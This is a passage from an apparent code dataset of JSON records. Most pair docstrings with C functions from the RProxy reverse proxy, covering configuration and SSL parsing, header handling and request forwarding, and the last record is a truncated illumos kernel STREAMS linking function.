!evutil_inet_ntop(sa->sa_family, src, tmp1, sizeof(tmp1))) {\n            return -1;\n        }\n\n        sres = snprintf(tmp2, sizeof(tmp2), fmt, tmp1, port);\n\n        if (sres < 0 || sres >= sizeof(tmp2)) {\n            return -1;\n        }\n\n        evhtp_kv_rm_and_free(headers, evhtp_kvs_find_kv(headers, \"X-Forwarded-For\"));\n\n        evhtp_headers_add_header(headers,\n                                 evhtp_header_new(\"X-Forwarded-For\", tmp2, 0, 1));\n    }\n\n    if (upstream_req->conn->ssl) {\n        if (append_ssl_x_headers(headers_cfg, upstream_req) < 0) {\n            return -1;\n        }\n    }\n\n    return 0;\n}", "path": "src\\rproxy.c", "repo_name": "fireeye/RProxy", "stars": 109, "license": "other", "language": "c", "size": 696}
{"docstring": "/* rproxy_cfg_parse_ */\n", "func_signal": "rproxy_cfg_t *\nrproxy_cfg_parse(const char * filename)", "code": "{\n    rproxy_cfg_t * rp_cfg;\n    cfg_t        * cfg;\n\n    if (!filename) {\n        return NULL;\n    }\n\n    if (!(cfg = cfg_init(rproxy_opts, CFGF_NOCASE))) {\n        return NULL;\n    }\n\n    if (cfg_parse(cfg, filename) != 0) {\n        cfg_free(cfg);\n        return NULL;\n    }\n\n    rp_cfg = rproxy_cfg_parse_(cfg);\n    cfg_free(cfg);\n\n    return rp_cfg;\n}", "path": "src\\cfg.c", "repo_name": "fireeye/RProxy", "stars": 109, "license": "other", "language": "c", "size": 696}
{"docstring": "/**\n * @brief Set an evhtp callback based on information in a single rule_cfg_t\n *        structure. Based on the rule type, we either use set_cb, set_regex_cb,\n *        or set_glob_cb. Only one real callback set is an on_hostname hook.\n *\n * @param elem\n * @param arg\n *\n * @return\n */\n", "func_signal": "static int\nadd_callback_rule(lztq_elem * elem, void * arg)", "code": "{\n    evhtp_t          * htp  = arg;\n    rule_cfg_t       * rule = lztq_elem_data(elem);\n    evhtp_callback_t * cb   = NULL;\n\n    switch (rule->type) {\n        case rule_type_exact:\n            cb = evhtp_set_cb(htp, rule->matchstr, NULL, rule);\n            break;\n        case rule_type_regex:\n            cb = evhtp_set_regex_cb(htp, rule->matchstr, NULL, rule);\n            break;\n        case rule_type_glob:\n            cb = evhtp_set_glob_cb(htp, rule->matchstr, NULL, rule);\n            break;\n        case rule_type_default:\n            /* default rules will match anything */\n            cb = evhtp_set_glob_cb(htp, \"*\", NULL, rule);\n            break;\n    }\n\n    if (cb == NULL) {\n        fprintf(stderr, \"Could not compile evhtp callback for pattern \\\"%s\\\"\\n\", rule->matchstr);\n        exit(EXIT_FAILURE);\n    }\n\n    /* if one of the callbacks matches, upstream_request_start will be called\n     * with the argument of this rule_cfg_t\n     */\n    evhtp_set_hook(&cb->hooks, evhtp_hook_on_hostname,\n                   upstream_request_start, rule);\n\n    return 0;\n}", "path": "src\\rproxy.c", "repo_name": "fireeye/RProxy", "stars": 109, "license": "other", "language": "c", "size": 696}
{"docstring": "/* map_vhost_rules_to_downstreams */\n", "func_signal": "static rule_t *\nfind_rule_from_cfg(rule_cfg_t * rule_cfg, lztq * rules)", "code": "{\n    lztq_elem * rule_elem;\n    lztq_elem * rule_elem_temp;\n\n    for (rule_elem = lztq_first(rules); rule_elem != NULL; rule_elem = rule_elem_temp) {\n        rule_t * rule = lztq_elem_data(rule_elem);\n\n        if (rule->config == rule_cfg) {\n            return rule;\n        }\n\n        rule_elem_temp = lztq_next(rule_elem);\n    }\n\n    return NULL;\n}", "path": "src\\rproxy.c", "repo_name": "fireeye/RProxy", "stars": 109, "license": "other", "language": "c", "size": 696}
{"docstring": "/* send_upstream_new_chunk */\n", "func_signal": "evhtp_res\nsend_upstream_chunk_done(evhtp_request_t * upstream_req, void * arg)", "code": "{\n    request_t      * request;\n    rproxy_t       * rproxy;\n    downstream_c_t * ds_conn;\n    rule_t         * rule;\n\n    request = arg;\n    assert(request != NULL);\n\n    rule    = request->rule;\n    assert(rule != NULL);\n\n    rproxy  = request->rproxy;\n    assert(rproxy != NULL);\n\n    ds_conn = request->downstream_conn;\n    assert(ds_conn != NULL);\n\n    if (!ds_conn->connection || request->error > 0) {\n        logger_log_request_error(rule->err_log, request,\n                                 \"%s(): conn = %p, err = %d\",\n                                 __FUNCTION__, ds_conn->connection, request->error);\n        return EVHTP_RES_ERROR;\n    }\n\n    bufferevent_write(ds_conn->connection, \"\\r\\n\", 2);\n    return EVHTP_RES_OK;\n}", "path": "src\\rproxy.c", "repo_name": "fireeye/RProxy", "stars": 109, "license": "other", "language": "c", "size": 696}
{"docstring": "/* append_x_headers */\n", "func_signal": "evhtp_res\nupstream_on_write(evhtp_connection_t * conn, void * args)", "code": "{\n    request_t * ds_req;\n\n    ds_req = args;\n    assert(ds_req != NULL);\n\n    if (ds_req->hit_upstream_highwm) {\n        /* upstream hit a high watermark for its write buffer, but now the\n         * buffer has been fully flushed, so we can enable the read side of the\n         * downstream again.\n         */\n        bufferevent_enable(ds_req->downstream_conn->connection, EV_READ);\n        ds_req->hit_upstream_highwm = 0;\n    }\n\n    return EVHTP_RES_OK;\n}", "path": "src\\rproxy.c", "repo_name": "fireeye/RProxy", "stars": 109, "license": "other", "language": "c", "size": 696}
{"docstring": "/**\n * @brief the evthr init callback. Setup rproxy event base and initialize\n *         downstream connections.\n *\n * @param htp\n * @param thr\n * @param arg\n */\n", "func_signal": "void\nrproxy_thread_init(evhtp_t * htp, evthr_t * thr, void * arg)", "code": "{\n    evbase_t     * evbase;\n    rproxy_t     * rproxy;\n    server_cfg_t * server_cfg;\n    int            res;\n\n    assert(htp != NULL);\n    assert(thr != NULL);\n\n    server_cfg          = arg;\n    assert(server_cfg != NULL);\n\n    evbase              = evthr_get_base(thr);\n    assert(evbase != NULL);\n\n    rproxy              = calloc(sizeof(rproxy_t), 1);\n    assert(rproxy != NULL);\n\n    rproxy->req_log     = logger_init(server_cfg->req_log_cfg, 0);\n    rproxy->err_log     = logger_init(server_cfg->err_log_cfg,\n                                      LZLOG_OPT_WNAME | LZLOG_OPT_WPID | LZLOG_OPT_WDATE);\n\n    rproxy->downstreams = lztq_new();\n    assert(rproxy->downstreams != NULL);\n\n    rproxy->rules       = lztq_new();\n    assert(rproxy->rules != NULL);\n\n    /* create a dns_base which is used for various resolution functions, e.g.,\n     * bufferevent_socket_connect_hostname()\n     */\n    rproxy->dns_base    = evdns_base_new(evbase, 1);\n    assert(rproxy->dns_base != NULL);\n\n    /* init our pending request tailq */\n    TAILQ_INIT(&rproxy->pending);\n\n    rproxy->server_cfg = server_cfg;\n    rproxy->evbase     = evbase;\n    rproxy->htp        = htp;\n\n    /* create a downstream_t instance for each configured downstream */\n    res = lztq_for_each(server_cfg->downstreams, add_downstream, rproxy);\n    assert(res == 0);\n\n    /* enable the pending request processing event, this event is triggered\n     * whenever a downstream connection becomes available.\n     */\n    rproxy->request_ev = event_new(evbase, -1, EV_READ | EV_PERSIST,\n                                   rproxy_process_pending, rproxy);\n    assert(rproxy->request_ev != NULL);\n\n    /* set aux data argument to this threads specific rproxy_t structure */\n    evthr_set_aux(thr, rproxy);\n\n    /* start all of our downstream connections */\n    res = lztq_for_each(rproxy->downstreams, start_downstream, evbase);\n    assert(res == 0);\n\n    {\n        /* for each virtual server, iterate over each rule_cfg and create a\n         * rule_t structure.\n         *\n         * Since each of these rule_t's are unique pointers, we append them\n         * to the global rproxy->rules list (evhtp takes care of the vhost\n         * matching, and the rule_cfg is passed as the argument to\n         * upstream_request_start).\n         *\n         * Each rule_t has a downstreams list containing pointers to\n         * (already allocated) downstream_t structures.\n         */\n        lztq_elem * vhost_cfg_elem = NULL;\n        lztq_elem * vhost_cfg_temp = NULL;\n\n        for (vhost_cfg_elem = lztq_first(server_cfg->vhosts); vhost_cfg_elem; vhost_cfg_elem = vhost_cfg_temp) {\n            vhost_cfg_t * vhost_cfg = lztq_elem_data(vhost_cfg_elem);\n            vhost_t     * vhost;\n\n            vhost          = calloc(sizeof(vhost_t), 1);\n            assert(vhost != NULL);\n\n            /* initialize the vhost specific logging, these are used if a rule\n             * does not have its own logging configuration. This allows for rule\n             * specific logs, and falling back to a global one.\n             */\n            vhost->req_log = logger_init(vhost_cfg->req_log, 0);\n            vhost->err_log = logger_init(vhost_cfg->err_log, 0);\n            vhost->config  = vhost_cfg;\n            vhost->rproxy  = rproxy;\n\n            res = lztq_for_each(vhost_cfg->rule_cfgs, map_vhost_rules_to_downstreams, vhost);\n            assert(res == 0);\n\n            vhost_cfg_temp = lztq_next(vhost_cfg_elem);\n        }\n    }\n\n    return;\n}", "path": "src\\rproxy.c", "repo_name": "fireeye/RProxy", "stars": 109, "license": "other", "language": "c", "size": 696}
{"docstring": "/**\n * @brief data was read from an upstream connection, pass it down to the\n * downstream.\n *\n * @param bev\n * @param arg\n */\n", "func_signal": "void\npassthrough_readcb(evbev_t * bev, void * arg)", "code": "{\n    request_t * request;\n\n    request = arg;\n    assert(request != NULL);\n\n    /* write the data read from the upstream bufferevent to the downstream\n     * bufferevent.\n     */\n    bufferevent_write_buffer(request->downstream_bev, bufferevent_get_input(bev));\n}", "path": "src\\rproxy.c", "repo_name": "fireeye/RProxy", "stars": 109, "license": "other", "language": "c", "size": 696}
{"docstring": "/**\n * @brief parses and creates a new ssl_cfg_t resource\n *\n * @param cfg the libconfuse structure for the ssl opts\n *\n * @return evhtp_ssl_cfg_t * on success, NULL on error.\n */\n", "func_signal": "evhtp_ssl_cfg_t *\nssl_cfg_parse(cfg_t * cfg)", "code": "{\n    evhtp_ssl_cfg_t * scfg;\n    long              ssl_opts        = SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3 | SSL_OP_NO_TLSv1;\n    int               ssl_verify_mode = 0;\n    int               proto_on_count;\n    int               proto_off_count;\n    int               i;\n    struct stat       file_stat;\n\n    if (cfg == NULL) {\n        return NULL;\n    }\n\n    if (cfg_getbool(cfg, \"enabled\") == cfg_false) {\n        return NULL;\n    }\n\n    if (!(scfg = ssl_cfg_new())) {\n        return NULL;\n    }\n\n    if (cfg_getstr(cfg, \"cert\")) {\n        scfg->pemfile = strdup(cfg_getstr(cfg, \"cert\"));\n        if (stat(scfg->pemfile, &file_stat) != 0) {\n            fprintf(stderr, \"Cannot find SSL cert file '%s'\\n\", scfg->pemfile);\n            exit(EXIT_FAILURE);\n        }\n    }\n\n    if (cfg_getstr(cfg, \"key\")) {\n        scfg->privfile = strdup(cfg_getstr(cfg, \"key\"));\n        if (stat(scfg->privfile, &file_stat) != 0) {\n            fprintf(stderr, \"Cannot find SSL key file '%s'\\n\", scfg->privfile);\n            exit(EXIT_FAILURE);\n        }\n    }\n\n    if (cfg_getstr(cfg, \"ca\")) {\n        scfg->cafile = strdup(cfg_getstr(cfg, \"ca\"));\n        if (stat(scfg->cafile, &file_stat) != 0) {\n            fprintf(stderr, \"Cannot find SSL ca file '%s'\\n\", scfg->cafile);\n            exit(EXIT_FAILURE);\n        }\n    }\n\n    if (cfg_getstr(cfg, \"capath\")) {\n        scfg->capath = strdup(cfg_getstr(cfg, \"capath\"));\n        if (stat(scfg->capath, &file_stat) != 0) {\n            fprintf(stderr, \"Cannot find SSL capath file '%s'\\n\", scfg->capath);\n            exit(EXIT_FAILURE);\n        }\n    }\n\n    if (cfg_getstr(cfg, \"ciphers\")) {\n        scfg->ciphers = strdup(cfg_getstr(cfg, \"ciphers\"));\n    }\n\n    if (cfg_getbool(cfg, \"verify-peer\") == cfg_true) {\n        ssl_verify_mode |= SSL_VERIFY_PEER;\n    }\n\n    if (cfg_getbool(cfg, \"enforce-peer-cert\") == cfg_true) {\n        ssl_verify_mode |= SSL_VERIFY_FAIL_IF_NO_PEER_CERT;\n    }\n\n    if (ssl_verify_mode != 0) {\n        scfg->verify_peer        = ssl_verify_mode;\n        scfg->verify_depth       = cfg_getint(cfg, \"verify-depth\");\n        scfg->x509_verify_cb     = ssl_x509_verifyfn;\n        scfg->x509_chk_issued_cb = NULL;\n    }\n\n    if (cfg_getbool(cfg, \"cache-enabled\") == cfg_true) {\n        scfg->scache_type    = evhtp_ssl_scache_type_internal;\n        scfg->scache_size    = cfg_getint(cfg, \"cache-size\");\n        scfg->scache_timeout = cfg_getint(cfg, \"cache-timeout\");\n    }\n\n    proto_on_count  = cfg_size(cfg, \"protocols-on\");\n    proto_off_count = cfg_size(cfg, \"protocols-off\");\n\n    for (i = 0; i < proto_on_count; i++) {\n        const char * proto_str = cfg_getnstr(cfg, \"protocols-on\", i);\n\n        if (!strcasecmp(proto_str, \"SSLv2\")) {\n            ssl_opts &= ~SSL_OP_NO_SSLv2;\n        } else if (!strcasecmp(proto_str, \"SSLv3\")) {\n            ssl_opts &= ~SSL_OP_NO_SSLv3;\n        } else if (!strcasecmp(proto_str, \"TLSv1\")) {\n            ssl_opts &= ~SSL_OP_NO_TLSv1;\n        } else if (!strcasecmp(proto_str, \"ALL\")) {\n            ssl_opts = 0;\n        }\n    }\n\n    for (i = 0; i < proto_off_count; i++) {\n        const char * proto_str = cfg_getnstr(cfg, \"protocols-off\", i);\n\n        if (!strcasecmp(proto_str, \"SSLv2\")) {\n            ssl_opts |= SSL_OP_NO_SSLv2;\n        } else if (!strcasecmp(proto_str, \"SSLv3\")) {\n            ssl_opts |= SSL_OP_NO_SSLv3;\n        } else if (!strcasecmp(proto_str, \"TLSv1\")) {\n            ssl_opts |= SSL_OP_NO_TLSv1;\n        } else if (!strcasecmp(proto_str, \"ALL\")) {\n            ssl_opts = SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3 | SSL_OP_NO_TLSv1;\n        }\n    }\n\n    scfg->ssl_ctx_timeout = cfg_getint(cfg, \"context-timeout\");\n    scfg->ssl_opts        = ssl_opts;\n\n    if (cfg_getsec(cfg, \"crl\")) {\n        ssl_crl_cfg_t * crl_config;\n        cfg_t         * crl_cfg;\n\n        crl_cfg = cfg_getsec(cfg, \"crl\");\n        assert(crl_cfg != NULL);\n\n        if (!(crl_config = calloc(sizeof(ssl_crl_cfg_t), 1))) {\n            fprintf(stderr, \"Could not allocate crl cfg %s\\n\", strerror(errno));\n            exit(EXIT_FAILURE);\n        }\n\n        if (cfg_getstr(crl_cfg, \"file\")) {\n            crl_config->filename = strdup(cfg_getstr(crl_cfg, \"file\"));\n\n            if (stat(crl_config->filename, &file_stat) == -1 || !S_ISREG(file_stat.st_mode)) {\n                fprintf(stderr, \"Cannot find CRL file '%s'\\n\", crl_config->filename);\n                exit(EXIT_FAILURE);\n            }\n        }\n\n        if (cfg_getstr(crl_cfg, \"dir\")) {\n            crl_config->dirname = strdup(cfg_getstr(crl_cfg, \"dir\"));\n\n            if (stat(crl_config->dirname, &file_stat) != 0 || !S_ISDIR(file_stat.st_mode)) {\n                fprintf(stderr, \"Cannot find CRL directory '%s'\\n\", crl_config->dirname);\n                exit(EXIT_FAILURE);\n            }\n        }\n\n        crl_config->reload_timer.tv_sec  = cfg_getnint(crl_cfg, \"reload\", 0);\n        crl_config->reload_timer.tv_usec = cfg_getnint(crl_cfg, \"reload\", 1);\n\n        /* at the moment evhtp does not give us an area where we can store this\n         * type of information without breaking the configuration structure. But\n         * it does have an optional user-supplied arguments, which we use here\n         * to store our CRL configuration.\n         */\n        scfg->args = (void *)crl_config;\n    }\n\n    return scfg;\n}", "path": "src\\cfg.c", "repo_name": "fireeye/RProxy", "stars": 109, "license": "other", "language": "c", "size": 696}
{"docstring": "/* rproxy_init */\n", "func_signal": "static void\nrproxy_process_pending(int fd, short which, void * arg)", "code": "{\n    rproxy_t  * rproxy;\n    request_t * request;\n    request_t * save;\n    int         res;\n\n    rproxy = arg;\n    assert(rproxy != NULL);\n\n    for (request = TAILQ_FIRST(&rproxy->pending); request; request = save) {\n        evhtp_request_t    * us_req;\n        evhtp_connection_t * us_conn;\n        rule_cfg_t         * rule_cfg;\n\n        save = TAILQ_NEXT(request, next);\n\n        if (!(request->downstream_conn = downstream_connection_get(request->rule))) {\n            continue;\n        }\n\n        /* set the connection to an active state so that other pending requests\n         * do not get this same downstream connection.\n         */\n        res = downstream_connection_set_active(request->downstream_conn);\n        assert(res >= 0);\n\n        /* remove this request from the pending queue */\n        TAILQ_REMOVE(&rproxy->pending, request, next);\n\n        request->downstream_bev           = request->downstream_conn->connection;\n        request->downstream_conn->request = request;\n        request->pending   = 0;\n        rproxy->n_pending -= 1;\n\n        if (request->pending_ev != NULL) {\n            /* delete the pending timer so that it does not trigger */\n            evtimer_del(request->pending_ev);\n        }\n\n        /* since the upstream request processing has been paused, we must\n         * unpause it to process it.\n         */\n        evhtp_request_resume(request->upstream_request);\n    }\n}", "path": "src\\rproxy.c", "repo_name": "fireeye/RProxy", "stars": 109, "license": "other", "language": "c", "size": 696}
{"docstring": "/**\n * @brief parses ssl x509 extension headers\n *\n * @param cfg\n *\n * @return\n */\n", "func_signal": "x509_ext_cfg_t *\nx509_ext_cfg_parse(cfg_t * cfg)", "code": "{\n    x509_ext_cfg_t * x509cfg;\n\n    if (cfg == NULL) {\n        return NULL;\n    }\n\n    if (!(x509cfg = x509_ext_cfg_new())) {\n        return NULL;\n    }\n\n    if (cfg_getstr(cfg, \"name\")) {\n        x509cfg->name = strdup(cfg_getstr(cfg, \"name\"));\n    }\n\n    if (cfg_getstr(cfg, \"oid\")) {\n        x509cfg->oid = strdup(cfg_getstr(cfg, \"oid\"));\n    }\n\n    return x509cfg;\n}", "path": "src\\cfg.c", "repo_name": "fireeye/RProxy", "stars": 109, "license": "other", "language": "c", "size": 696}
{"docstring": "/**\n * @brief free ssl configuration resources\n *\n * @param c\n */\n", "func_signal": "void\nssl_cfg_free(evhtp_ssl_cfg_t * c)", "code": "{\n    if (c == NULL) {\n        return;\n    }\n\n    if (c->pemfile) {\n        free(c->pemfile);\n    }\n    if (c->privfile) {\n        free(c->privfile);\n    }\n    if (c->cafile) {\n        free(c->cafile);\n    }\n    if (c->capath) {\n        free(c->capath);\n    }\n    if (c->ciphers) {\n        free(c->ciphers);\n    }\n\n    free(c);\n}", "path": "src\\cfg.c", "repo_name": "fireeye/RProxy", "stars": 109, "license": "other", "language": "c", "size": 696}
{"docstring": "/* server_cfg_parse */\n", "func_signal": "static rproxy_cfg_t *\nrproxy_cfg_parse_(cfg_t * cfg)", "code": "{\n    rproxy_cfg_t * rpcfg;\n    int            i;\n\n    assert(cfg != NULL);\n\n    rpcfg = rproxy_cfg_new();\n    assert(rpcfg != NULL);\n\n    if (cfg_getstr(cfg, \"user\")) {\n        rpcfg->user = strdup(cfg_getstr(cfg, \"user\"));\n    }\n\n    if (cfg_getstr(cfg, \"group\")) {\n        rpcfg->group = strdup(cfg_getstr(cfg, \"group\"));\n    }\n\n    if (cfg_getstr(cfg, \"rootdir\")) {\n        rpcfg->rootdir = strdup(cfg_getstr(cfg, \"rootdir\"));\n    }\n\n    rpcfg->max_nofile = cfg_getint(cfg, \"max-nofile\");\n    rpcfg->daemonize  = cfg_getbool(cfg, \"daemonize\");\n\n    for (i = 0; i < cfg_size(cfg, \"server\"); i++) {\n        lztq_elem    * elem;\n        server_cfg_t * scfg;\n\n        scfg = server_cfg_parse(cfg_getnsec(cfg, \"server\", i));\n        assert(scfg != NULL);\n\n        scfg->rproxy_cfg = rpcfg;\n\n        elem = lztq_append(rpcfg->servers, scfg, sizeof(scfg), server_cfg_free);\n        assert(elem != NULL);\n    }\n\n    /* set our rusage settings from the global one */\n    memcpy(&rpcfg->rusage, &_rusage, sizeof(rproxy_rusage_t));\n\n    return rpcfg;\n}", "path": "src\\cfg.c", "repo_name": "fireeye/RProxy", "stars": 109, "license": "other", "language": "c", "size": 696}
{"docstring": "/* send_upstream_body */\n", "func_signal": "evhtp_res\nsend_upstream_new_chunk(evhtp_request_t * upstream_req, uint64_t len, void * arg)", "code": "{\n    request_t      * request;\n    rproxy_t       * rproxy;\n    downstream_c_t * ds_conn;\n    rule_t         * rule;\n\n    request = arg;\n    assert(request != NULL);\n\n    rproxy  = request->rproxy;\n    assert(rproxy != NULL);\n\n    rule    = request->rule;\n    assert(rproxy != NULL);\n\n    if (!upstream_req) {\n        logger_log(rproxy->err_log, lzlog_err, \"%s(): !upstream_req\", __FUNCTION__);\n\n        return EVHTP_RES_FATAL;\n    }\n\n    if (!(ds_conn = request->downstream_conn)) {\n        logger_log_request_error(rule->err_log, request,\n                                 \"%s(): downstream_conn == NULL\", __FUNCTION__);\n        return EVHTP_RES_FATAL;\n    }\n\n    if (!ds_conn->connection || request->error > 0) {\n        logger_log_request_error(rule->err_log, request,\n                                 \"%s(): conn = %p, err = %d\",\n                                 __FUNCTION__, ds_conn->connection, request->error);\n        return EVHTP_RES_ERROR;\n    }\n\n    evbuffer_add_printf(bufferevent_get_output(ds_conn->connection),\n                        \"%x\\r\\n\", (unsigned int)len);\n\n    return EVHTP_RES_OK;\n}", "path": "src\\rproxy.c", "repo_name": "fireeye/RProxy", "stars": 109, "license": "other", "language": "c", "size": 696}
{"docstring": "/* add_vhost */\n", "func_signal": "int\nrproxy_init(evbase_t * evbase, rproxy_cfg_t * cfg)", "code": "{\n    lztq_elem * serv_elem;\n    lztq_elem * serv_temp;\n\n    assert(evbase != NULL);\n    assert(cfg != NULL);\n\n    /* iterate over each server_cfg, and set up evhtp stuff */\n    for (serv_elem = lztq_first(cfg->servers); serv_elem != NULL; serv_elem = serv_temp) {\n        struct timeval * tv_read  = NULL;\n        struct timeval * tv_write = NULL;\n        evhtp_t        * htp;\n        server_cfg_t   * server;\n\n        server = lztq_elem_data(serv_elem);\n        assert(server != NULL);\n\n        /* create a new evhtp base structure for just this server, all vhosts\n         * will use this as a parent\n         */\n        htp    = evhtp_new(evbase, NULL);\n        assert(htp != NULL);\n\n        /* we want to make sure 100-continue is not sent by evhtp, but the\n         * downstreams themselves.\n         */\n        evhtp_disable_100_continue(htp);\n\n        /* create a pre-accept callback which will disconnect the client\n         * immediately if the max-pending request queue is over the configured\n         * limit.\n         */\n        evhtp_set_pre_accept_cb(htp, upstream_pre_accept, NULL);\n\n        if (server->ssl_cfg) {\n            /* enable SSL support on this server */\n            evhtp_ssl_init(htp, server->ssl_cfg);\n\n            /* if CRL checking is enabled, create a new ssl_crl_ent_t and add it\n             * to the evhtp_t's arguments. XXX: in the future we should create a\n             * generic wrapper for various things we want to put in the evhtp\n             * arguments, but for now, the only thing that we care about is the\n             * CRL context.\n             */\n            if (server->ssl_cfg->args) {\n                ssl_crl_cfg_t * crl_cfg = server->ssl_cfg->args;\n\n                htp->arg = ssl_crl_ent_new(htp, crl_cfg);\n                assert(htp->arg != NULL);\n            }\n        }\n\n        /* for each vhost, create a child virtual host and stick it in our main\n         * evhtp structure.\n         */\n        lztq_for_each(server->vhosts, add_vhost, htp);\n\n        /* if configured, set our upstream connection's read/write timeouts */\n        if (server->read_timeout.tv_sec || server->read_timeout.tv_usec) {\n            tv_read = &server->read_timeout;\n        }\n\n        if (server->write_timeout.tv_sec || server->write_timeout.tv_usec) {\n            tv_write = &server->write_timeout;\n        }\n\n        if (tv_read || tv_write) {\n            evhtp_set_timeouts(htp, tv_read, tv_write);\n        }\n\n        /* use a worker thread pool for connections, and for each\n         * thread that is initialized call the rproxy_thread_init\n         * function. rproxy_thread_init will create a new rproxy_t\n         * instance for each of the threads\n         */\n        evhtp_use_threads(htp, rproxy_thread_init,\n                          server->num_threads, server);\n\n        if (evhtp_bind_socket(htp,\n                              server->bind_addr,\n                              server->bind_port,\n                              server->listen_backlog) < 0) {\n            fprintf(stderr, \"[ERROR] unable to bind to %s:%d (%s)\\n\",\n                    server->bind_addr,\n                    server->bind_port,\n                    strerror(errno));\n            exit(-1);\n        }\n\n        if (server->disable_server_nagle == 1) {\n            /* disable the tcp nagle algorithm for the listener socket */\n            evutil_socket_t sock;\n\n            sock = evconnlistener_get_fd(htp->server);\n            assert(sock >= 0);\n\n            setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (int[]) { 1 }, sizeof(int));\n        }\n\n\n        serv_temp = lztq_next(serv_elem);\n    }\n\n    return 0;\n}", "path": "src\\rproxy.c", "repo_name": "fireeye/RProxy", "stars": 109, "license": "other", "language": "c", "size": 696}
{"docstring": "/* send_upstream_headers */\n", "func_signal": "evhtp_res\nsend_upstream_body(evhtp_request_t * upstream_req, evbuf_t * buf, void * arg)", "code": "{\n    /* stream upstream request body to the downstream server */\n    request_t      * request;\n    rule_t         * rule;\n    rproxy_t       * rproxy;\n    downstream_c_t * ds_conn;\n\n    request = arg;\n    assert(request != NULL);\n\n    rproxy  = request->rproxy;\n    assert(rproxy != NULL);\n\n    rule    = request->rule;\n    assert(rule != NULL);\n\n    if (!upstream_req || !buf) {\n        logger_log_request_error(rule->err_log, request,\n                                 \"%s(): up_req = %p, buf = %p\", __FUNCTION__, upstream_req, buf);\n        return EVHTP_RES_FATAL;\n    }\n\n    if (!(ds_conn = request->downstream_conn)) {\n        logger_log_request_error(rule->err_log, request,\n                                 \"%s(): downstream_conn == NULL\", __FUNCTION__);\n        return EVHTP_RES_FATAL;\n    }\n\n    if (!ds_conn->connection || request->error > 0) {\n        logger_log_request_error(rule->err_log, request,\n                                 \"%s(): conn = %p, req error = %d\",\n                                 __FUNCTION__, ds_conn->connection, request->error);\n        evbuffer_drain(buf, -1);\n\n        return EVHTP_RES_ERROR;\n    }\n\n    bufferevent_write_buffer(ds_conn->connection, buf);\n\n    if (ds_conn->parent->config->high_watermark > 0) {\n        if (evbuffer_get_length(bufferevent_get_output(ds_conn->connection)) >= ds_conn->parent->config->high_watermark) {\n            request->hit_highwm = 1;\n#ifdef RPROXY_DEBUG\n            printf(\"Hit high-watermark %zu: %zu in output\\n\",\n                   ds_conn->parent->config->high_watermark,\n                   evbuffer_get_length(bufferevent_get_output(ds_conn->connection)));\n#endif\n            evhtp_request_pause(upstream_req);\n            return EVHTP_RES_PAUSE;\n        }\n    }\n\n    return EVHTP_RES_OK;\n}", "path": "src\\rproxy.c", "repo_name": "fireeye/RProxy", "stars": 109, "license": "other", "language": "c", "size": 696}
{"docstring": "/*\n * ldi_mlink_fp() is invoked for all successfull streams linkages created\n * via I_LINK and I_PLINK.  ldi_mlink_fp() records the linkage information\n * in its internal state so that the devinfo snapshot code has some\n * observability into streams device linkage information.\n */\n", "func_signal": "void\nldi_mlink_fp(struct stdata *stp, file_t *fpdown, int lhlink, int type)", "code": "{\n\tvnode_t\t\t\t*vp = fpdown->f_vnode;\n\tstruct snode\t\t*sp, *csp;\n\tldi_ident_t\t\tli;\n\tmajor_t\t\t\tmajor;\n\tint\t\t\tret;\n\n\t/* if the lower stream is not a device then return */\n\tif (!vn_matchops(vp, spec_getvnodeops()))\n\t\treturn;\n\n\tASSERT(!servicing_interrupt());\n\n\tLDI_STREAMS_LNK((CE_NOTE, \"%s: linking streams \"\n\t    \"stp=0x%p, fpdown=0x%p\", \"ldi_mlink_fp\",\n\t    (void *)stp, (void *)fpdown));\n\n\tsp = VTOS(vp);\n\tcsp = VTOS(sp->s_commonvp);\n\n\t/* check if this was a plink via a layered handle */\n\tif (lhlink) {\n\t\t/*\n\t\t * increment the common snode s_count.\n\t\t *\n\t\t * this is done because after the link operation there\n\t\t * are two ways that s_count can be decremented.\n\t\t *\n\t\t * when the layered handle used to create the link is\n\t\t * closed, spec_close() is called and it will decrement\n\t\t * s_count in the common snode.  if we don't increment\n\t\t * s_count here then this could cause spec_close() to\n\t\t * actually close the device while it's still linked\n\t\t * under a multiplexer.\n\t\t *\n\t\t * also, when the lower stream is unlinked, closef() is\n\t\t * called for the file_t associated with this snode.\n\t\t * closef() will call spec_close(), which will decrement\n\t\t * s_count.  if we dont't increment s_count here then this\n\t\t * could cause spec_close() to actually close the device\n\t\t * while there may still be valid layered handles\n\t\t * pointing to it.\n\t\t */\n\t\tmutex_enter(&csp->s_lock);\n\t\tASSERT(csp->s_count >= 1);\n\t\tcsp->s_count++;\n\t\tmutex_exit(&csp->s_lock);\n\n\t\t/*\n\t\t * decrement the f_count.\n\t\t * this is done because the layered driver framework does\n\t\t * not actually cache a copy of the file_t allocated to\n\t\t * do the link.  this is done here instead of in ldi_mlink_lh()\n\t\t * because there is a window in ldi_mlink_lh() between where\n\t\t * milnk_file() returns and we would decrement the f_count\n\t\t * when the stream could be unlinked.\n\t\t */\n\t\tmutex_enter(&fpdown->f_tlock);\n\t\tfpdown->f_count--;\n\t\tmutex_exit(&fpdown->f_tlock);\n\t}\n\n\t/*\n\t * NOTE: here we rely on the streams subsystem not allowing\n\t * a stream to be multiplexed more than once.  if this\n\t * changes, we break.\n\t *\n\t * mark the snode/stream as multiplexed\n\t */\n\tmutex_enter(&sp->s_lock);\n\tASSERT(!(sp->s_flag & SMUXED));\n\tsp->s_flag |= SMUXED;\n\tmutex_exit(&sp->s_lock);\n\n\t/* get a layered ident for the upper stream */\n\tif (type == LINKNORMAL) {\n\t\t/*\n\t\t * if the link is not persistant then we can associate\n\t\t * the upper stream with a dev_t.  this is because the\n\t\t * upper stream is associated with a vnode, which is\n\t\t * associated with a dev_t and this binding can't change\n\t\t * during the life of the stream.  since the link isn't\n\t\t * persistant once the stream is destroyed the link is\n\t\t * destroyed.  so the dev_t will be valid for the life\n\t\t * of the link.\n\t\t */\n\t\tret = ldi_ident_from_stream(getendq(stp->sd_wrq), &li);\n\t} else {\n\t\t/*\n\t\t * if the link is persistant we can only associate the\n\t\t * link with a driver (and not a dev_t.)  this is\n\t\t * because subsequent opens of the upper device may result\n\t\t * in a different stream (and dev_t) having access to\n\t\t * the lower stream.\n\t\t *\n\t\t * for example, if the upper stream is closed after the\n\t\t * persistant link operation is compleated, a subsequent\n\t\t * open of the upper device will create a new stream which\n\t\t * may have a different dev_t and an unlink operation\n\t\t * can be performed using this new upper stream.\n\t\t */\n\t\tASSERT(type == LINKPERSIST);\n\t\tmajor = 